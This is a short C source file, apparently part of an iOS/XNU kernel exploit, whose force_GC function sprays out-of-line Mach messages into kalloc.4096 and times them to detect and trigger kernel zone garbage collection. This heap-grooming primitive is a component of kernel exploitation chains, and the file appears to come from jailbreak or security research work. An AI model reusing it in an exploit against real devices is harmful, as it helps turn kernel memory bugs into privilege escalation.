#include "gc.h"

// IBSparkes
void force_GC() {
    int i, j;
    uint64_t t0, t1;
    uint8_t *data;
    mach_port_t gc_ports[N_GC_PORTS];

    unsigned long greatest = 0;

    data = calloc(KALLOC_4096, sizeof(uint8_t));

    for (i = 0; i < N_GC_PORTS; i++) {
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gc_ports[i]) != KERN_SUCCESS) {
            printf("gc_ports Allocation %d Failed", i);
            break;
        }
        t0 = mach_absolute_time();
        if (ool_descriptor_spray(&gc_ports[i], data, KALLOC_4096) != MACH_MSG_SUCCESS) {
            printf("Sending Mach Message %d Failed", i);
            mach_port_destroy(mach_task_self(), gc_ports[i]);
            break;
        }
        t1 = mach_absolute_time();

        if (t1-t0 > greatest) {
            greatest = t1-t0;
            printf("i: %d greatest: %lu\n", i, greatest);
        }
        if (t1 - t0 > GC_TIME) {
            mach_port_destroy(mach_task_self(), gc_ports[i]);
            printf("Got garbage collection 0x%x\n", i);
            break;
        }
    }

    for (j = 0; j < i; j++)
	    mach_port_destroy(mach_task_self(), gc_ports[j]);

    free(data);
    sleep(1);
    return;
}